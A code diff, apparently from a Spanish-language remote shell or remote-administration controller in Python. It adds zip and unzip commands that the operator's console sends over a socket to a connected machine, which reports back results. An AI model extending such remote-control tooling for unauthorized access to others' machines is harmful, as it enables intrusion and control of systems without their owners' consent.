@@ -371,6 +371,24 @@ class TCP:
             self.__conexion.send(destino.encode())
             self.enviarDirectorio(origen, index)
 
+    def comprimir(self, cmd):
+        self.__conexion.send(cmd.encode())
+        msg = self.__conexion.recv(1024).decode()
+
+        if msg[:6] != "error:":
+            print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+        else:
+            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
+    def descomprimir(self, cmd):
+        self.__conexion.send(cmd.encode())
+        msg = self.__conexion.recv(1024).decode()
+
+        if msg[:6] != "error:":
+            print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+        else:
+            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
     def shell(self):
         try:
             while True:
@@ -467,6 +485,27 @@ class TCP:
 
                     except:
                         print(Fore.RED + "[-] Error de proceso (sdt)")
+
+                elif cmd.lower()[:3] == "zip":
+                    try:
+                        if re.search("-o", cmd):
+                            self.comprimir(cmd)
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (zip)")
+
+                elif cmd.lower()[:5] == "unzip":
+                    try:
+                        if re.search("-o", cmd):
+                            self.descomprimir(cmd)
+
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-o)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (unzip)")
 
                 else:
                     try:
